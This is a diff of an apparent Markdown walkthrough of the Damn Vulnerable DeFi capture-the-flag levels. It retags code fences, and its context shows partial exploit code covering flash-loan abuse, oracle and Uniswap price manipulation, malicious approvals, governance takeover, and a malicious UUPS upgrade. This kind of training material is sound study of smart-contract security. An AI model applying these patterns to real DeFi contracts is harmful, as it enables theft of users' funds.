@@ -43,14 +43,14 @@ You start with 10 DVT tokens in balance.
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower
 ```
 
 - `onFlashLoan` : handles flashloan logics.
 - `executeFlashLoan` : do flashloan.
 
-```
+```solidity
 contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626
 ```
 
@@ -65,7 +65,7 @@ The goal is to make the business logic halt. The best way is to mess up the stat
 
 Transfer some tokens to the vault address.
 
-```
+```javascript
 await token.transfer(vault.address, ethers.utils.parseEther('1'));
 ```
 
@@ -81,13 +81,13 @@ Take all ETH out of the user’s contract. If possible, in a single transaction.
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender
 ```
 
 - `flashLoan` : do flashloan, checks if receiver’s `onFlashLoan` callback is successful
 
-```
+```solidity
 contract FlashLoanReceiver is IERC3156FlashBorrower
 ```
 
@@ -108,7 +108,7 @@ The goal is to drain **user**’s balance, not pool. We can setup a MITM contrac
 
 In the MITM contract, call
 
-```
+```solidity
 user.onFlashLoan(address(0x0), address(token), 0, 10 ether, "");
 ```
 
@@ -124,7 +124,7 @@ To pass this challenge, take all tokens out of the pool. If possible, in a singl
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract TrusterLenderPool is ReentrancyGuard
 ```
 
@@ -138,7 +138,7 @@ Well…it allows anyone to call `flashLoan` , and we have control of `target` an
 
 In our evil contract, do things like the following:
 
-```
+```solidity
 target = address(token);
 data = abi.encodeWithSignature(
 	"approve(address,uint256)",
@@ -160,7 +160,7 @@ Starting with 1 ETH in balance, pass the challenge by taking all ETH from the po
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract SideEntranceLenderPool
 ```
 
@@ -184,7 +184,7 @@ Again, we need to payback the loans, but since it calls a callback function whic
 
 In our contract, we would have things like:
 
-```
+```solidity
 execute() {
 	pool.deposit(msg.value);
 }
@@ -210,25 +210,25 @@ By the way, rumors say a new pool has just launched. Isn’t it offering flash l
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract AccountingToken is ERC20Snapshot, OwnableRoles
 ```
 
 - nothing special, some casual ERC20Snapshot implementation contract
 
-```
+```solidity
 contract FlashLoanerPool is ReentrancyGuard
 ```
 
 - `flashLoan` : does low-level call to `msg.sender` with function `receiveFlashLoan(uint256)`
 
-```
+```solidity
 contract RewardToken is ERC20, OwnableRoles
 ```
 
 - again, nothing special.
 
-```
+```solidity
 contract TheRewarderPool
 ```
 
@@ -247,13 +247,13 @@ The prompt kinda gives it away. Hinting us to get a flashloan and try to get the
 
 First:
 
-```
+```javascript
 await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
 ```
 
 Then deploy a contract similar to this:
 
-```
+```solidity
 contract FlashLoanReceiver{
 	...
 	function receiveFlashLoan(uint256 amount){
@@ -276,14 +276,14 @@ You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract SelfiePool is ReentrancyGuard, IERC3156FlashLender
 ```
 
 - `flashLoan` : does flashloan, and checks `receiver.onFlashLoan` callback function.
 - `emergencyExit` : can only be called when `msg.sender == address(governance)` , this function transfers all its tokens to a receiver which is provided by caller.
 
-```
+```solidity
 contract SimpleGovernance is ISimpleGovernance
 ```
 
@@ -291,7 +291,7 @@ contract SimpleGovernance is ISimpleGovernance
 - `executeAction` : as the name suggests. Executes the action by doing a low-level call on target address which is specified in the action struct.
 - `_hasEnoughVotes` : a private function, but the logic for checking if proposer has enough votes lies here. It checks if the balance from governance token’s last snapshot is more than half of the entire shares.
 
-```
+```solidity
 contract DamnValuableTokenSnapshot is ERC20Snapshot
 ```
 
@@ -313,7 +313,7 @@ Our goal is to drain all tokens in the pool. The `emergencyExit` function seems 
 
 Your helper contract should look like this:
 
-```
+```solidity
 contract Helper is IERC3156FlashBorrower {
 	...
 	uint256 public id;
@@ -340,7 +340,7 @@ contract Helper is IERC3156FlashBorrower {
 
 While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:
 
-```
+```http
 HTTP/2 200 OK
 content-type: text/html
 content-language: en
@@ -360,20 +360,20 @@ Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH a
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract Exchange is ReentrancyGuard
 ```
 
 - `buyOne` : buy one NFT, the price is determined with the average value among the three oracles.
 - `sellOne` : sell one NFT, and the price is determined the same way as above.
 
-```
+```solidity
 contract TrustfulOracle is AccessControlEnumerable
 ```
 
 - `postPrice` : sets the price of NFT, sender must be one of the three oracles.
 
-```
+```solidity
 contract TrustfulOracleInitializer
 ```
 
@@ -393,7 +393,7 @@ With private keys, we can easily gain control of the two oracles, and then set p
 
 The explanation above should be somewhat self-explanatory. To send transactions on another wallet’s behave, do this:
 
-```
+```javascript
 await oracle.connect(compromised_oracle1).postPrice(0)
 ```
 
@@ -411,7 +411,7 @@ Pass the challenge by taking all tokens from the lending pool. You start with 25
 
 ### Contracts & Key Function
 
-```
+```solidity
 contract PuppetPool is ReentrancyGuard
 ```
 
@@ -421,13 +421,13 @@ contract PuppetPool is ReentrancyGuard
 
 The pool gets the price based on UniswapV1. In UniswapV1, constant product formula is used. This is to say that:
 
-```
+```text
 Amount_X * Amount_Y = k
 ```
 
 The price is determined where:
 
-```
+```ini
 Price_X = Amount_Y / Amount_X
 ```
 
@@ -456,7 +456,7 @@ You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DV
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract PuppetV2Pool
 ```
 
@@ -475,7 +475,7 @@ The ideas are similar. UniswapV2 and UniswapV1 doesn’t change much when it com
 
 I found deploying a helper contract is helpful. Your contract should look like this:
 
-```
+```solidity
 interface IUniswapV2Router02 {
 	function swapExactTokensForETH(
 		uint amountIn,
@@ -534,14 +534,14 @@ If only you could get free ETH, at least for an instant.
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract FreeRiderNFTMarketplace is ReentrancyGuard
 ```
 
 - `buyMany` : buys many NFTs at once, calls `_buyOne` for each NFT purchase.
 - `_buyOne` : buys one single NFT, checks if `msg.value >= price` , otherwise reverts. Also, it transfers NFT ownership, **then** send NFT’s price to owner.
 
-```
+```solidity
 contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver
 ```
 
@@ -564,7 +564,7 @@ We can utilize the flashswap, get those NFTs and their payouts, then transfer ou
 
 Again, the contract below is not finished, but your attacker contract should look like:
 
-```
+```solidity
 contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
 	...
 	function uniswapV2Call(address, uint, uint, bytes calldata) external {
@@ -610,7 +610,7 @@ Your goal is to take all funds from the registry. In a single transaction.
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract WalletRegistry is IProxyCreationCallback, Ownable
 ```
 
@@ -624,7 +624,7 @@ When the setup function is called, it will executes the data provided in the par
 
 Remember that when proxies are created, rewards are transferred to the proxies. When we let the delegate to call us with function like:
 
-```
+```solidity
 function callback(address token, address recipient) external {
 	IERC20(token).approve(recipient, 10 ether);
 }
@@ -641,7 +641,7 @@ Normally, this would not work, because `msg.sender` is us, and it will approve t
 
 Important functions are here:
 
-```
+```solidity
 function attack(address[] memory users, address player) public{
   for (uint i = 0; i < users.length; i++) {
     address[] memory owner = new address[](1);
@@ -692,7 +692,7 @@ To pass this challenge, take all tokens from the vault.
 
 I switched to forge-DVD for this level, just FYI.
 
-```
+```solidity
 contract ClimberTimelock is AccessControl
 ```
 
@@ -702,7 +702,7 @@ contract ClimberTimelock is AccessControl
 - `getOperationId` returns the operation hash based on the parameters.
 - `execute` executes the operation based on parameters, checks the status of operationId, is the operation is valid, will execute the low-level call. The function reverts when it finds out the operation is not ready to be executed, but it does the check at the end of the function.
 
-```
+```solidity
 contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable
 ```
 
@@ -720,7 +720,7 @@ This leads us to find a way to set the delay of the operations. Like I mentioned
 
 But, what do we want to get out of the `execute` function? You see, the vault is an UUPS contract. If we can upgrade the logic contract to a new implementation contract which we have total control of, we can do whatever we want as vault. Now, the issue is, how can we upgrade to to a new implementation? By reading the UUPS contract code, we see if we want to upgrade the proxy contract, we would need:
 
-```
+```solidity
 function upgradeTo(address newImplementation) external virtual onlyProxy {
     _authorizeUpgrade(newImplementation);
     _upgradeToAndCallUUPS(newImplementation, new bytes(0), false);
@@ -739,7 +739,7 @@ And we see `_authorizeUpgrade` has a `onlyOwner` modifier. This means we want to
 
 Some snippets of solution:
 
-```
+```solidity
 address[] memory targets = new address[](4);
 uint256[] memory values = new uint256[](4);
 bytes[] memory data = new bytes[](4);
@@ -768,7 +768,7 @@ vaultTimelock.execute(targets, values, data, "");
 
 In your helper contract:
 
-```
+```java
 function callback() external {
     address[] memory targets = new address[](4);
     uint256[] memory values = new uint256[](4);
@@ -812,7 +812,7 @@ function attack() external {
 
 And the evil implementation:
 
-```
+```solidity
 contract EvilVault is ClimberVault {
     constructor() {
 
@@ -838,14 +838,14 @@ Pass the challenge by obtaining all tokens held by the wallet deployer contract.
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract AuthorizerUpgradeable is Initializable, OwnableUpgradeable, UUPSUpgradeable
 ```
 
 - `can` returns the double dimension array of if the caller and the proxy address are legit.
 - `upgradeToAndCall` upgrades the logic contract to a new implementation.
 
-```
+```solidity
 contract WalletDeployer
 ```
 
@@ -880,7 +880,7 @@ Once we have the raw transaction, we can try to re-create those two contracts on
 
 To make the nonce increase, we can simply transfer some ethers to the deployer’s address, like:
 
-```
+```javascript
 await player.sendTransaction({
 	to: 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A,
 	value: ethers.utils.parseEther('1')
@@ -889,7 +889,7 @@ await player.sendTransaction({
 
 Then we do:
 
-```
+```javascript
 await ethers.provider.sendTransaction(//masterCopy creation raw data//);
 ```
 
@@ -897,7 +897,7 @@ Now, we have masterCopy and factory contracts up. The next step is to think abou
 
 In EVM, there are two opcodes for creating contracts: `CREATE` and `CREATE2` . Their key difference is how the address is evaluated.
 
-```
+```solidity
 // CREATE
 address = keccak256(address(deployer), nonce);
 
@@ -944,7 +944,7 @@ Starting with 1 ETH and some DVT, pass this challenge by taking all tokens from 
 
 ### Contracts & Key Functions
 
-```
+```solidity
 contract PuppetV3Pool
 ```
 
@@ -968,7 +968,7 @@ The challenge limits us from elapsing only 115 seconds, but it’s more than eno
 
 I used a contract to help me, and actually, you have to use a contract as UniswapV3 does a callback on `receiver`
 
-```
+```javascript
 // token0: WETH
 // token1: DVD
 function doSwap(int256 amount) external {
@@ -1020,7 +1020,7 @@ function uniswapV3SwapCallback(
 
 With ethers.js:
 
-```
+```javascript
 attacker = await (await ethers.getContractFactory('PuppetV3Attacker', deployer)).deploy(lendingPool.address);
 await player.sendTransaction(
     {
@@ -1051,14 +1051,14 @@ Before it’s too late, rescue all funds from the vault, transferring them back 
 
 ### Contracts & Key Functions
 
-```
+```solidity
 abstract contract AuthorizedExecutor is ReentrancyGuard
 ```
 
 - `execute` executes input bytes as data in low-level, but checks if the function `msg.sender` is allowed to call.
 - `setPermissions` sets the function selector which the specific address can call in `execute`
 
-```
+```solidity
 contract SelfAuthorizedVault is AuthorizedExecutor
 ```
 
@@ -1070,7 +1070,7 @@ During deployment, we are authorized to call `withdraw` , but this is not enough
 
 In short, when handling dynamic types like `bytes calldata` , ABI uses the pointer-length-value encoding, for example, in the `execute` function:
 
-```
+```solidity
 function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
     // Read the 4-bytes selector at the beginning of `actionData`
     bytes4 selector;
@@ -1091,7 +1091,7 @@ function execute(address target, bytes calldata actionData) external nonReentran
 
 There are two parameters, and the ABI to call this function will have format of this:
 
-```
+```solidity
 |selector(4 bytes)|address(32 bytes)|bytes.pointer(32 bytes)|bytes.length(32 bytes)|bytes.data|
 ```
 
@@ -1103,7 +1103,7 @@ And that was the attack idea, not too easy to understand, and also not easy to p
 
 I will drop the solution here, because this one is kind hard to explain well. I strongly recommend readers to read [https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a#4cdc](https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a#4cdc)
 
-```
+```javascript
 helper = await (await ethers.getContractFactory('AbiSmugglingHelper', deployer)).deploy(vault.address, token.address)
 calldata = await helper.help(recovery.address);
 // execute selector:
